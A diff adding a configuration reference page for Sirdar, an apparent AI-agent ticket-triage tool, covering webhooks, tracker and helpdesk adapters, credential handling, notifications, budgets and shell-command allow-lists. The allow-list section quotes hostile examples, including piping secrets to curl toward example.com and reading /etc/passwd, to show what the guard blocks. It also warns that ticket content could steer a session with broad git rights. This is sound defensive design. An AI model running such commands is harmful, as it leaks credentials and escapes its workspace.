+<td>Credential reference (<code>env:NAME</code> or <code>keychain:SERVICE</code>) for the endpoint's key; required alongside <code>qwen.baseUrl</code></td>
+</tr>
+<tr>
+<td><code>webhooks.enabled</code></td>
+<td>bool</td>
+<td><code>false</code></td>
+<td>Whether <code>sirdar serve</code> registers the inbound trigger endpoints at all; with it off every path under <code>/hooks/</code> is a 404</td>
+</tr>
+<tr>
+<td><code>webhooks.sources.&lt;name&gt;</code></td>
+<td>object</td>
+<td>unset</td>
+<td>One per enabled source: <code>jira</code>, <code>linear</code>, <code>azdo</code>, <code>rally</code>, <code>zendesk</code>, <code>freshdesk</code>, <code>intercom</code>, <code>hubspot</code>, <code>generic</code>. An unknown name fails config load</td>
+</tr>
+<tr>
+<td><code>webhooks.sources.&lt;name&gt;.secret</code></td>
+<td>string</td>
+<td>none (required, except <code>azdo</code>)</td>
+<td>Credential ref for the signing secret or shared secret</td>
+</tr>
+<tr>
+<td><code>webhooks.sources.azdo.username</code></td>
+<td>string</td>
+<td>none (required)</td>
+<td>Basic-auth username configured on the Azure DevOps service hook; written literally, it is not a secret</td>
+</tr>
+<tr>
+<td><code>webhooks.sources.azdo.password</code></td>
+<td>string</td>
+<td>none (required)</td>
+<td>Credential ref for the matching password</td>
+</tr>
+<tr>
+<td><code>webhooks.match.assignee</code></td>
+<td>string, optional</td>
+<td>unset</td>
+<td><code>me</code> (the account email on <code>sources.tracker</code>, else <code>sources.helpdesk</code>) or an address or account id. A delivery naming a different assignee, or none at all, is skipped</td>
+</tr>
+<tr>
+<td><code>webhooks.match.statuses</code></td>
+<td>list, optional</td>
+<td>unset</td>
+<td>Accepted statuses, matched case-insensitively against whatever the payload carries; a payload naming no status passes</td>
+</tr>
+<tr>
+<td><code>webhooks.match.labels</code></td>
+<td>list, optional</td>
+<td>unset</td>
+<td>Accepted labels, same semantics</td>
+</tr>
+<tr>
+<td><code>webhooks.cooldown</code></td>
+<td>duration, optional</td>
+<td><code>10m</code></td>
+<td>A key triaged this recently is skipped; <code>0s</code> disables the cooldown</td>
+</tr>
+<tr>
+<td><code>acp.command</code></td>
+<td>string</td>
+<td>none (required for <code>provider: acp</code>)</td>
+<td>The ACP agent's program: <code>gemini</code>, <code>goose</code>, <code>opencode</code>, <code>npx</code></td>
+</tr>
+<tr>
+<td><code>acp.args</code></td>
+<td>list of string, optional</td>
+<td>unset</td>
+<td>The rest of the agent's command line, e.g. <code>["--experimental-acp"]</code></td>
+</tr>
+<tr>
+<td><code>acp.env</code></td>
+<td>map, optional</td>
+<td>unset</td>
+<td>Literal environment entries added to the agent's environment; these are values, not credential references</td>
+</tr>
+</tbody>
+</table>
+<p><code>{key}</code> and <code>{slug}</code> in a filename pattern are replaced with the ticket key and a slugified
+title. A pattern may also contain <code>/</code> segments to file notes into a subdirectory of <code>notes.dir</code>
+that a vault already expects, e.g. <code>notes.filenames.triage: "Triage/{key} {slug}.md"</code> files
+triage notes under <code>Triage/</code>, and <code>RCA/{key} RCA {slug}.md</code> / <code>Resolutions/{key} RES {slug}.md</code>
+do the same for RCA and resolution notes. Sirdar creates any missing subdirectory when it writes
+the note. A segment that is empty (including the one a leading <code>/</code> produces) or exactly <code>..</code> is
+dropped rather than followed, so a pattern can't write outside <code>notes.dir</code>; re-triage still finds
+and overwrites a triage note filed this way, searching <code>notes.dir</code> recursively (skipping
+dot-directories such as <code>.obsidian</code>) for a match by key and frontmatter tag rather than by exact
+path. <code>provider</code>, <code>billing</code>, and <code>concurrency</code> are validated at load time: an unrecognised
+<code>provider</code> or <code>billing</code> value, or a <code>concurrency</code> below 1, fails config load with a message
+naming the offending key. Budget values must all be greater than zero. A configured source's
+adapter-specific fields are required only for that adapter; <code>sources.tracker</code> and
+<code>sources.helpdesk</code> are each optional, but a source config with no <code>adapter</code> set is an error.</p>
+<h2 id="inbound-webhook-triggers">Inbound webhook triggers<a class="headerlink" href="#inbound-webhook-triggers" title="Permanent link">&para;</a></h2>
+<p>The <code>webhooks</code> block configures the endpoints <code>sirdar serve</code> exposes at
+<code>POST /hooks/&lt;workspace-id&gt;/&lt;source&gt;</code>, so a tracker or helpdesk can start a triage when a ticket
+is assigned. Everything in it is validated at load time whether or not it is enabled, so a
+mistyped source name or a secret written out literally fails the first time the workspace loads
+rather than the first time a hook fires. <code>docs/webhooks.md</code> has the per-source setup steps, the
+signing schemes, and the <code>--allow-remote</code> warning.</p>
+<h2 id="built-in-trackers">Built-in trackers<a class="headerlink" href="#built-in-trackers" title="Permanent link">&para;</a></h2>
+<p><code>jira</code>, <code>linear</code>, <code>azdo</code> and <code>rally</code> are compiled into Sirdar, so they need no adapter process.
+They are tracker adapters: naming one under <code>sources.helpdesk</code> fails config load and points you
+at <code>sources.tracker</code>. Config load checks what each one cannot work without:</p>
+<table>
+<thead>
+<tr>
+<th>Adapter</th>
+<th>Required</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>jira</code></td>
+<td><code>baseUrl</code>, and either <code>email</code> + <code>apiToken</code> (Cloud) or <code>pat</code> (Data Center)</td>
+<td><code>deployment</code> must be <code>cloud</code>, <code>datacenter</code> or <code>auto</code></td>
+</tr>
+<tr>
+<td><code>linear</code></td>
+<td><code>apiKey</code></td>
+<td>The endpoint is fixed at <code>https://api.linear.app/graphql</code></td>
+</tr>
+<tr>
+<td><code>azdo</code></td>
+<td><code>orgUrl</code>, <code>project</code>, <code>pat</code></td>
+<td>The PAT needs the <code>vso.work</code> scope</td>
+</tr>
+<tr>
+<td><code>rally</code></td>
+<td><code>apiKey</code>, <code>workspace</code></td>
+<td><code>baseUrl</code> defaults to <code>https://rally1.rallydev.com</code></td>
+</tr>
+</tbody>
+</table>
+<p>Each of these trackers also carries the conversation on the issue itself, so it can fill the
+helpdesk role as well: when <code>sources.helpdesk</code> is unset, Sirdar reads the thread and the
+attachments from the same adapter. A configured <code>sources.helpdesk</code> always wins.</p>
+<p><code>sirdar doctor</code> prints one row per built-in tracker, from a single authenticated call against
+the cheapest endpoint the API has — Jira's <code>serverInfo</code>, Linear's <code>viewer</code>, the Azure DevOps
+project, Rally's current user:</p>
+<div class="highlight"><pre><span></span><code>[OK] sources.tracker (jira) — reachable (https://acme.atlassian.net)
+</code></pre></div>
+<h3 id="helpdeskref-fallback">helpdeskRef fallback<a class="headerlink" href="#helpdeskref-fallback" title="Permanent link">&para;</a></h3>
+<p>A tracker that has no native link to the helpdesk — no Jira Service Management request, no
+Linear customer-request attachment, no Azure DevOps hyperlink or custom field — often still
+names the support ticket in its description, as a URL somebody pasted. <code>helpdeskRef</code> turns that
+into a rule the workspace owns:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">sources</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">tracker</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">helpdeskRef</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">pattern</span><span class="p">:</span><span class="w"> </span><span class="s">'Zoho</span><span class="nv"> </span><span class="s">Ticket</span><span class="nv"> </span><span class="s">URL:\s*(\S+)'</span>
+<span class="w">      </span><span class="nt">idPattern</span><span class="p">:</span><span class="w"> </span><span class="s">'(\d+)$'</span>
+</code></pre></div>
+<p><code>pattern</code> is matched against the ticket description and its one capture group is the reference;
+<code>idPattern</code>, when set, is applied to that capture and its one capture group is the id Sirdar
+passes to the helpdesk. Both are Go regular expressions, both are compiled at config load, and
+both must have exactly one capture group — a pattern with none or with several fails the load
+rather than a run. The fallback only fills in what the adapter left empty, so a tracker with
+native linkage is never overridden. A description that does not match leaves the reference
+empty and Sirdar reads the helpdesk by the ticket key instead; a <code>pattern</code> that matched while
+<code>idPattern</code> did not is recorded as a run warning, because that is a rule to fix rather than a
+ticket without a link.</p>
+<h3 id="list-limits">List limits<a class="headerlink" href="#list-limits" title="Permanent link">&para;</a></h3>
+<p><code>ListFilter.Limit</code> is capped by the adapters, not by the caller: <code>0</code> means 100 results and the
+maximum is 200. An adapter paginates its API as far as it has to in order to fill the limit, and
+never returns more than it was asked for.</p>
+<h2 id="built-in-helpdesks">Built-in helpdesks<a class="headerlink" href="#built-in-helpdesks" title="Permanent link">&para;</a></h2>
+<p><code>zohodesk</code>, <code>zendesk</code>, <code>freshdesk</code>, <code>helpscout</code>, <code>intercom</code> and <code>hubspot</code> are compiled into
+Sirdar; only <code>zohodesk</code> needs a separate "Zoho Desk OAuth" section below because of its
+refresh-token grant. Config load checks what each of the others cannot work without:</p>
+<table>
+<thead>
+<tr>
+<th>Adapter</th>
+<th>Required</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>zendesk</code></td>
+<td><code>subdomain</code>, and either <code>email</code> + <code>apiToken</code> or <code>oauthToken</code></td>
+<td><code>baseUrl</code> optionally overrides <code>https://{subdomain}.zendesk.com</code></td>
+</tr>
+<tr>
+<td><code>freshdesk</code></td>
+<td><code>domain</code>, <code>apiKey</code></td>
+<td><code>domain</code> is the full account host, e.g. <code>acme.freshdesk.com</code></td>
+</tr>
+<tr>
+<td><code>helpscout</code></td>
+<td><code>clientId</code>, <code>clientSecret</code></td>
+<td>Help Scout has no API-key mode; Sirdar mints its own access tokens from the pair</td>
+</tr>
+<tr>
+<td><code>intercom</code></td>
+<td><code>accessToken</code></td>
+<td>A workspace access token from Intercom's Developer Hub</td>
+</tr>
+<tr>
+<td><code>hubspot</code></td>
+<td><code>accessToken</code></td>
+<td>A private-app token (<code>pat-na1-…</code>); HubSpot retired API keys in 2022</td>
+</tr>
+</tbody>
+</table>
+<p>The last three talk to one fixed vendor host each — <code>api.helpscout.net</code>, <code>api.intercom.io</code>,
+<code>api.hubapi.com</code> — so none of them takes a <code>baseUrl</code>. An Intercom workspace on the EU or AU
+data-residency host is not supported by this adapter yet; calls to the US host are proxied by
+Intercom, which works but is not what Intercom recommends.</p>
+<div class="highlight"><pre><span></span><code><span class="nt">sources</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">helpdesk</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">adapter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zendesk</span>
+<span class="w">    </span><span class="nt">subdomain</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">acme</span>
+<span class="w">    </span><span class="nt">email</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:ZENDESK_EMAIL</span>
+<span class="w">    </span><span class="nt">apiToken</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:ZENDESK_API_TOKEN</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nt">sources</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">helpdesk</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">adapter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">freshdesk</span>
+<span class="w">    </span><span class="nt">domain</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">acme.freshdesk.com</span>
+<span class="w">    </span><span class="nt">apiKey</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:FRESHDESK_API_KEY</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nt">sources</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">helpdesk</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">adapter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">helpscout</span>
+<span class="w">    </span><span class="nt">clientId</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keychain:helpscout-client-id</span>
+<span class="w">    </span><span class="nt">clientSecret</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keychain:helpscout-client-secret</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nt">sources</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">helpdesk</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">adapter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">intercom</span>
+<span class="w">    </span><span class="nt">accessToken</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:INTERCOM_ACCESS_TOKEN</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nt">sources</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">helpdesk</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">adapter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">hubspot</span>
+<span class="w">    </span><span class="nt">accessToken</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:HUBSPOT_PRIVATE_APP_TOKEN</span>
+</code></pre></div>
+<p><code>sirdar doctor</code> prints one row per built-in helpdesk, from a single authenticated call — the
+signed-in user for <code>zendesk</code>, the signed-in agent for <code>freshdesk</code>, one page of one mailbox for
+<code>helpscout</code>, <code>/me</code> for <code>intercom</code>, the account details for <code>hubspot</code> — and names who the
+connection authenticates as, never the credential itself:</p>
+<div class="highlight"><pre><span></span><code>[OK] sources.helpdesk (zendesk) — reachable as you@acme.com
+[OK] sources.helpdesk (freshdesk) — reachable as acme.freshdesk.com
+[OK] sources.helpdesk (helpscout) — reachable as the Help Scout app
+[OK] sources.helpdesk (intercom) — reachable as the workspace access token
+[OK] sources.helpdesk (hubspot) — reachable as the private app token
+</code></pre></div>
+<p>A Zendesk source authenticated with <code>oauthToken</code> instead of <code>email</code>/<code>apiToken</code> reports <code>reachable
+as oauth</code>, since there is no account email to show for that grant. The last three name the kind
+of grant rather than an account, because none of their probes returns an account identifier worth
+printing — the row itself is the proof the credential was accepted.</p>
+<h2 id="credential-references">Credential references<a class="headerlink" href="#credential-references" title="Permanent link">&para;</a></h2>
+<p><code>sources.*.token</code> (and any credential in config) is never a literal secret: config load rejects
+a value that doesn't start with one of four schemes, all of which resolve on macOS, Linux and
+Windows.</p>
+<ul>
+<li><code>env:NAME</code> reads the environment variable <code>NAME</code> at fetch time.</li>
+<li><code>keychain:SERVICE</code> reads the operating system's own credential store: the macOS login
+  keychain via <code>security</code>, the freedesktop Secret Service via <code>secret-tool</code> (with <code>pass</code> as a
+  fallback) on Linux and the BSDs, the Windows Credential Manager via <code>CredRead</code>.</li>
+<li><code>file:PATH</code> reads a file that holds nothing but the secret. A leading <code>~</code> expands, one
+  trailing newline is dropped, and a file readable beyond its owner is refused.</li>
+<li><code>cmd:COMMAND</code> takes the standard output of a credential helper — <code>op read</code>, <code>bw get</code>,
+  <code>vault kv get</code>, <code>gopass show</code> — with a 10-second timeout.</li>
+</ul>
+<p><strong><a href="../credentials/"><code>docs/credentials.md</code></a> is the whole story</strong>: what to run to store a secret on
+each OS, the <code>file:</code> permission rule, <code>cmd:</code> recipes for the common password managers, and the
+rule that Sirdar never writes a credential anywhere.</p>
+<p>Resolved values are held in memory only: never written to a run directory, and never placed in
+the agent's environment. Every <code>env:</code> variable named anywhere in <code>sources.*</code> — <code>token</code>, the
+built-in adapters' <code>apiToken</code>, <code>pat</code>, <code>apiKey</code> and <code>oauthToken</code>, and all three parts of an <code>auth</code>
+grant — is stripped from the environment the agent process inherits, so a session that can run
+shell commands cannot read them back out. The <code>notify:</code> block's webhook URLs, header values and
+signing secret are stripped the same way, for the same reason. <code>email</code> is the one adapter credential field that is not
+a reference: it is an account name, not a secret, and it is left in place.</p>
+<h2 id="zoho-desk-oauth">Zoho Desk OAuth<a class="headerlink" href="#zoho-desk-oauth" title="Permanent link">&para;</a></h2>
+<p>A Zoho Desk access token expires an hour after it is issued, so <code>token:</code> cannot carry a run
+nobody is watching. <code>auth:</code> names a <a href="https://www.zoho.com/accounts/protocol/oauth/self-client/overview.html">Zoho Self
+Client</a> instead, and
+Sirdar exchanges its refresh token for a fresh access token whenever the one it holds is within
+a minute of expiry, or when Desk rejects it (one retry per request, then the failure stands).
+Set <code>token</code> or <code>auth</code>, not both.</p>
+<div class="highlight"><pre><span></span><code><span class="nt">sources</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">helpdesk</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">adapter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zohodesk</span>
+<span class="w">    </span><span class="nt">orgId</span><span class="p">:</span><span class="w"> </span><span class="s">"60044805777"</span>
+<span class="w">    </span><span class="nt">baseUrl</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://desk.zoho.in</span>
+<span class="w">    </span><span class="nt">auth</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">clientId</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keychain:zoho-desk-client-id</span>
+<span class="w">      </span><span class="nt">clientSecret</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keychain:zoho-desk-client-secret</span>
+<span class="w">      </span><span class="nt">refreshToken</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keychain:zoho-desk-refresh-token</span>
+</code></pre></div>
+<p><code>accountsUrl</code> is the accounts server for the data centre the desk lives in, and is normally left
+out: it is derived from <code>baseUrl</code> for the four Zoho hosts below. A <code>baseUrl</code> outside that list
+has to name it, since sending the grant to the wrong data centre's accounts server only fails.</p>
+<table>
+<thead>
+<tr>
+<th><code>baseUrl</code> host</th>
+<th>derived <code>accountsUrl</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>desk.zoho.in</code></td>
+<td><code>https://accounts.zoho.in</code></td>
+</tr>
+<tr>
+<td><code>desk.zoho.com</code></td>
+<td><code>https://accounts.zoho.com</code></td>
+</tr>
+<tr>
+<td><code>desk.zoho.eu</code></td>
+<td><code>https://accounts.zoho.eu</code></td>
+</tr>
+<tr>
+<td><code>desk.zoho.com.au</code></td>
+<td><code>https://accounts.zoho.com.au</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>sirdar doctor</code> performs one refresh and reports it, so a revoked grant is caught before a run
+spends an agent session on it:</p>
+<div class="highlight"><pre><span></span><code>[OK] zoho oauth — access token obtained, expires in 3600s
+[OK] sources.helpdesk (zohodesk) — https://desk.zoho.in
+</code></pre></div>
+<p>A refused grant reports the reason the accounts server gave — <code>invalid_client</code>, <code>invalid_code</code>
+— and never any part of the credentials.</p>
+<h2 id="notifications">Notifications<a class="headerlink" href="#notifications" title="Permanent link">&para;</a></h2>
+<p>A <code>notify:</code> block posts a short digest of every finished run to a Slack channel, a Microsoft
+Teams channel, or any HTTP receiver. Every destination is optional and they can be combined;
+with no block, nothing is posted.</p>
+<div class="highlight"><pre><span></span><code><span class="nt">notify</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">on</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">completed</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">failed</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">over_budget</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">blocked</span><span class="p p-Indicator">]</span><span class="w">   </span><span class="c1"># default: all four</span>
+<span class="w">  </span><span class="nt">includeTitle</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
+<span class="w">  </span><span class="nt">slack</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">webhookUrl</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keychain:sirdar-slack-webhook</span>
+<span class="w">  </span><span class="nt">teams</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">webhookUrl</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:TEAMS_WEBHOOK</span>
+<span class="w">  </span><span class="nt">generic</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://hooks.example.com/sirdar</span>
+<span class="w">      </span><span class="nt">headers</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">Authorization</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:SIRDAR_HOOK_TOKEN</span>
+<span class="w">      </span><span class="nt">secret</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:SIRDAR_HOOK_SECRET</span>
+</code></pre></div>
+<p>The message carries the run's metadata — key, state, confidence, classification, service, run
+id, turns, cost, duration, the reason a run ended badly, and the paths and links a human follows
+— and no part of a note's body. The ticket title is sent only with <code>includeTitle: true</code>, because
+a support ticket's subject line routinely names the customer who filed it and a chat channel is
+a wider audience than the notes directory.</p>
+<p>A chat <code>webhookUrl</code> is a credential reference, never the URL itself: an incoming-webhook URL
+carries its own authorisation in its path. A generic hook's <code>url</code> is a plain URL, because the
+receiver authenticates through the headers instead; those header values, and <code>secret</code>, are
+references when they carry a credential. Every <code>env:</code> name the block uses is stripped from the
+agent session's environment along with the adapters' credentials.</p>
+<p>A post that fails is a warning on the run and never a failed run: the note is already on disk
+when it goes out, and the run does not return until every destination's post has settled. Each
+destination gets a hard 15-second ceiling — the request, and one retry on <code>429</code> or <code>5xx</code>
+honouring a <code>Retry-After</code> of up to 30 seconds, all inside that budget — and interrupting the run
+does not cut a post short, since the channel is still owed a message about a run whose note
+already exists. The failure lands in <code>state.json</code>'s <code>warnings</code> and on the progress stream, with
+the webhook URL reduced to its host and no part of the receiver's response, so the line is safe
+to paste. <code>SIRDAR_NO_NOTIFY=1</code>, <code>sirdar triage --no-notify</code> and <code>sirdar rca --no-notify</code> silence
+one invocation.</p>
+<p>Setting up each destination — the Slack app, the Teams workflow, and a receiver that verifies
+the HMAC signature — is in <code>docs/notifications.md</code>.</p>
+<h2 id="budgets">Budgets<a class="headerlink" href="#budgets" title="Permanent link">&para;</a></h2>
+<p>Three budgets end a run early, and they do not all see the same thing.</p>
+<p><strong><code>budget.maxTurns</code> counts model round-trips.</strong> One turn is one assistant message that calls a
+tool or gives the final answer — the same unit the Claude CLI reports as <code>num_turns</code> in its
+result line. Thinking blocks are part of the round-trip they precede, not turns of their own,
+and a response that calls three tools in parallel is three round-trips because the CLI counts
+it that way. Sirdar keeps a running count while the session streams and reconciles it to the
+CLI's <code>num_turns</code> when the result line arrives, so <code>state.json</code> ends the run holding the
+provider's own figure. A real triage of a busy ticket takes 40–60 turns; the default of 120
+leaves room for a hard one. (An earlier version counted every assistant <em>line</em>, which ran about
+1.5x ahead — 61 against the CLI's 41 — and cancelled a session mid-tool on a budget it had not
+spent.)</p>
+<p><strong><code>budget.maxUsd</code> is an end-of-run check with Claude.</strong> Claude Code reports cost only in its
+result line, so <code>state.json</code> shows <code>costUsd: 0</code> for the whole of a running session no matter
+how much it is spending, and progress views show <code>n/a</code> rather than a <code>$0.00</code> that would read
+like a free run. The cost budget therefore records an overspend after the fact; it cannot stop
+one in flight. <code>maxTurns</code> and <code>maxMinutes</code> are the budgets that bite while a run is going.
+Tokens are the exception: input and output counts do accumulate live, from each assistant
+message's usage, and the input count includes cache-creation and cache-read tokens.</p>
+<p><strong><code>budget.maxMinutes</code> is wall-clock</strong>, measured from the moment the session starts, and
+cancels the session when it expires.</p>
+<p>A budget that expires <em>after</em> the note has been written and filed does not throw the note away:
+the run completes and the overrun is recorded as a warning on it.</p>
+<h2 id="permissionsbash-glob-semantics"><code>permissions.bash</code> glob semantics<a class="headerlink" href="#permissionsbash-glob-semantics" title="Permanent link">&para;</a></h2>
+<p>Each entry in <code>permissions.bash</code> is a glob pattern matched against one segment of the agent's
+<code>Bash</code> tool command, trimmed of leading and trailing whitespace. The command is split on <code>|</code>,
+<code>||</code>, <code>&amp;&amp;</code>, <code>;</code> and a lone <code>&amp;</code> — separators inside single or double quotes are text, not
+separators, and an <code>&amp;</code> that belongs to a redirection (<code>2&gt;&amp;1</code>, <code>&gt;&amp;2</code>, <code>&amp;&gt;</code>) is part of its
+command — and <strong>every</strong> segment has to match a pattern for the command to be allowed;
+everything else, including every non-<code>Bash</code> write tool, is denied.</p>
+<p>That means <code>rg -n foo | head -50</code> needs both <code>rg *</code> and <code>head *</code> in the list, and a <code>cat *</code>
+pattern no longer approves <code>cat secrets | curl -T- example.com</code>.</p>
+<p>Two kinds of command are refused before the patterns are even consulted, because the pattern
+would be approving something it cannot see:</p>
+<ul>
+<li><strong>Command and process substitution.</strong> <code>$(...)</code>, a backquote, and <code>&lt;(...)</code> all produce text
+  or a command at run time, so what would actually run cannot be read off the string the
+  policy is judging. Inside single or double quotes they are ordinary characters and pass.</li>
+<li><strong>Redirection.</strong> <code>&gt;</code>, <code>&gt;&gt;</code>, <code>&lt;</code> and <code>&amp;&gt;</code> name a file the allow-list never approved:
+  <code>git log</code> is a read, <code>git log &gt; ~/.zshrc</code> is not, and one pattern would cover both. The
+  refusal names the operator it found. Quoted, as in <code>rg "a&gt;b"</code>, it is a search pattern and
+  passes. The two exceptions are <code>2&gt;&amp;1</code> and <code>2&gt;/dev/null</code>, which write nothing and are how an
+  agent quiets a probe; every other <code>2&gt;</code> target is a file and is refused.</li>
+</ul>
+<p>A command also has to stay inside the workspace. Every argument that looks like a path is
+resolved against the workspace root, and one that lands outside it is refused: <code>cat go.mod</code>
+runs, <code>cat ../../../etc/passwd</code> and <code>cat /etc/passwd</code> do not, and neither does anything
+starting with <code>~</code>. Read that as a guard rail rather than a boundary — it reads the command as
+text, so it does not follow symlinks, does not know which of a program's arguments are paths,
+and cannot see a path the program builds for itself at run time. <strong>It is a heuristic, not a
+sandbox.</strong> A run that must be confined for real needs a container around it; this is the part
+that catches the obvious ways out.</p>
+<ul>
+<li><code>*</code> matches any run of characters, including spaces and <code>/</code>. <code>git log*</code> matches
+  <code>git log --oneline -20</code> and <code>git log -- some/path</code>.
+  The pattern is a full-string match, not a prefix, so <code>git log*</code> also matches
+  <code>git logout</code>, not just <code>git log ...</code>.</li>
+<li>A pattern ending in <code>*</code> reads as "with any arguments", and matches the bare command too:
+  <code>ls *</code> allows both <code>ls -la</code> and the <code>ls</code> next to it in a compound command.</li>
+<li><code>?</code> matches exactly one character.</li>
+<li>Matching is case-sensitive.</li>
+<li>The pattern is anchored to the whole command string, not a prefix or substring: <code>git log</code>
+  without a trailing <code>*</code> matches only the exact command <code>git log</code>, with no arguments.</li>
+</ul>
+<h2 id="permissionsfixbash"><code>permissions.fixBash</code><a class="headerlink" href="#permissionsfixbash" title="Permanent link">&para;</a></h2>
+<p><code>sirdar fix</code> is the one session allowed to change the workspace, and it needs a different set
+of shell commands than a triage run does: it has to branch, build and test. Rather than widen
+<code>permissions.bash</code> — which would hand every read-only triage run the same reach — a fix session
+is matched against its own list.</p>
+<p>The syntax is exactly the one above: the same segment splitting, the same refusal of
+substitution and redirection, the same workspace-root check on anything that looks like a path.
+Only the list changes, and only for <code>sirdar fix</code>.</p>
+<p>The default is the git commands that read the repository, and the build and test commands a
+fix has to run before it can claim to work:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">permissions</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">fixBash</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">status*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">diff*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">log*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">show*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">grep*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">blame*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"dotnet</span><span class="nv"> </span><span class="s">build*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"dotnet</span><span class="nv"> </span><span class="s">test*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"npm</span><span class="nv"> </span><span class="s">test*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"go</span><span class="nv"> </span><span class="s">build*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"go</span><span class="nv"> </span><span class="s">test*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"make</span><span class="nv"> </span><span class="s">*"</span>
+</code></pre></div>
+<p>The git entries are named one by one rather than covered by <code>git *</code>, and that is deliberate.
+Sirdar makes the branch, the commit and the push itself — after the JSON report comes back and
+after the deviation check — so nothing in the flow needs the agent to reach <code>git commit</code>,
+<code>git push</code>, <code>git reset</code> or <code>git config</code>. A blanket <code>git *</code> hands all of them to whatever the
+session reads in a ticket.</p>
+<p>Naming your own list replaces the default outright — it is a starting point, not a floor — so
+include whatever of it you still want:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">permissions</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">fixBash</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">log*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"git</span><span class="nv"> </span><span class="s">diff*"</span>
